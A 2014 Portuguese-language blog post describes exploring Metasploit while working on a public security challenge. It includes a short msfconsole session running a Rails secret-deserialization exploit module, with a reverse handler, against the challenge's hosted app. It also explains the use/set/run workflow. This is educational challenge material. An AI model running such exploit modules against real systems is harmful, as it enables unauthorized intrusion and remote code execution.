---
title: "[Small Bite] Brincando com Metasploit"
date: "2014-08-27T17:03:00.000Z"
tags: ["security"]
years: "2014"
---

<p></p>
<p>Ontem o <a href="https://twitter.com/joernchen">@joernchen</a> mandou um pequeno <a href="https://twitter.com/joernchen/status/504304803045208064">desafio básico de segurança</a> pra comunidade. Ele postou um código de uma pequena aplicação, colocou ela no ar, e nos desafiou a resetar a senha do administrador.</p>
<p>Confesso que demorei mais do que gostaria mas no fim eu consegui - e foi simples (post sobre isso vem depois).</p>
<p>No caminho eu acabei explorando o <a href="http://www.metasploit.com">Metasploit</a>, provavelmente um dos melhores e mais conhecidos pacotes de testes de penetração de segurança. E alguns não sabem disso mas ele não só é código-aberto (existem ferramentas e serviços pagos) como é uma aplicação Rails! Então vale muito a pena acompanhar esse projeto.</p>
<p></p>
<p></p>
<p>O @joernchen já <a href="https://github.com/rapid7/metasploit-framework/commits?author=joernchen">contribuiu no código</a> do Metasploit incluindo o famigerado exploit para <a href="https://github.com/rapid7/metasploit-framework/commit/7f3eccd64453c3708ad4cb7ed7a6ea18354bac3d">Remote Code Execution no Rails</a> (calma, as versões novas já não tem mais isso!)</p>
<p>Instalar o Metasploit no seu sistema é simples. Este <a href="https://www.darkoperator.com/installing-metasploit-in-ubunt/">blog post</a> descreve como. Ele começa falando para baixar um script que faz tudo mas, se você usa RVM ou RBenv ou não usa Ubuntu, faça na mão, é mais simples. Não vou repetir o que já está no post então acompanhe lá.</p>
<p>No final, você deve ter o metasploit instalado e com o comando <tt>msfconsole</tt> a partir de onde já dá pra começar a brincar. Por exemplo, uma das coisas que eu tentei ver foi se o aplicativo do desafio sofria o problema de remote code execution que mencionei acima, pra isso, uma vez dentro do console eu fiz:</p>
<table class="CodeRay">
  <tbody>
    <tr>
      <td class="line-numbers" title="double click to toggle" ondblclick="with (this.firstChild.style) { display = (display == '') ? 'none' : '' }"><pre><a href="#n1" name="n1">1</a>
<a href="#n2" name="n2">2</a>
<a href="#n3" name="n3">3</a>
<a href="#n4" name="n4">4</a>
<a href="#n5" name="n5">5</a>
<a href="#n6" name="n6">6</a>
<a href="#n7" name="n7">7</a>
<a href="#n8" name="n8">8</a>
<a href="#n9" name="n9">9</a>
<strong><a href="#n10" name="n10">10</a></strong>
</pre>
      </td>
      <td class="code"><pre>msf exploit(rails_json_yaml_code_exec) &gt; use exploit/multi/http/rails_secret_deserialization
msf exploit(rails_secret_deserialization) &gt; set RHOST getthisadmin.herokuapp.com
msf exploit(rails_secret_deserialization) &gt; set TARGETURI /reset/_csrf_token
msf exploit(rails_secret_deserialization) &gt; run
[*] Started reverse handler on 192.168.47.172:4444
[*] Checking for cookie _csrf_token
[!] Caution: Cookie not found, maybe you need to adjust TARGETURI
[*] Trying to leverage default controller without cookie confirmation.
[*] Sending cookie _csrf_token
msf exploit(rails_secret_deserialization) &gt; exit
</pre>
      </td>
    </tr>
  </tbody>
</table>
<p>E podemos ver que o problema não é esse. No Metasploit você carrega um dos muitos módulos de exploit que quer explorar (veja <a href="https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/multi/http">lista no próprio código fonte</a>). Cada exploit tem várias opções pra configurar (execute <tt>show options</tt> para mostrar as configurações). Use o comando <tt>set</tt> para configurar com o site que quer explorar. Finalmente, rode com <tt>run</tt> para executar e ver se tem o exploit ou não.</p>
<p>Eu mesmo não sou um expert em segurança mas conheço o básico e explorar o Metasploit pode ser uma excelente fonte para você entender como funcionam exploits de segurança. O código de cada módulo é em Ruby e é muito fácil de ler.</p>
<p>E já descobriram o desafio do @joernchen? Neste post eu já dei uma grande dica ;-) Comentem se conseguiram, mas não dêem a resposta ainda pra todo mundo poder testar.</p>
<p></p>